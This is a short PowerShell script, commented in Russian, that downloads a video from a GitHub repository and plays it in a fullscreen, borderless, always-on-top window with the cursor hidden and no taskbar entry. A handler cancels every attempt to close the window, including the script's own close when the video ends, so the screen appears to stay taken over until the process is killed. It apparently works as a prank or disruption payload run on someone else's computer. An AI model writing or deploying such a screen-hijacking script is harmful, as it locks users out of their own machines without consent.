# Принудительно включаем TLS 1.2 для скачивания
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

$u = 'https://github.com/ymkeee/T-Embed/raw/refs/heads/main/edit.mp4'
# ИСПОЛЬЗУЕМ [Guid]::NewGuid() вместо просто Guid
$f = "$env:TEMP\$([Guid]::NewGuid()).mp4" 

try {
    Invoke-WebRequest -Uri $u -OutFile $f
} catch { exit }

[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" WindowState="Maximized" Topmost="True" 
        Background="Black" Cursor="None" ShowInTaskbar="False">
    <Grid><MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" /></Grid>
</Window>
"@

$reader = New-Object System.Xml.XmlNodeReader $xaml
$w = [Windows.Markup.XamlReader]::Load($reader)
$v = $w.FindName("v")
$v.add_MediaEnded({ $w.Close() })
$w.Add_Closing({ $_.Cancel = $true })

$w.ShowDialog() | Out-Null

# Очистка
Start-Sleep -Seconds 1
if (Test-Path $f) { Remove-Item -Path $f -Force }
